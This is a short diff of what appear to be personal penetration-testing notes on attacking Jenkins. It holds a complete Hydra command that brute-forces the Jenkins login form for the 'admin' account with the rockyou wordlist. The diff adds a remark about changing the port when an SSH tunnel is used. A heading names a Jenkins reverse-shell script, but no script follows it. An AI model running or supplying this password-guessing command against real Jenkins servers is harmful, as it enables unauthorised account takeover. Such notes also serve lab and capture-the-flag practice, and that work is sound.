@@ -1,6 +1,8 @@
 in JENKINS
 hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
 
+in place of 8080 (-L port)
+
 
 Reverse-shell-script-JENKINS
 
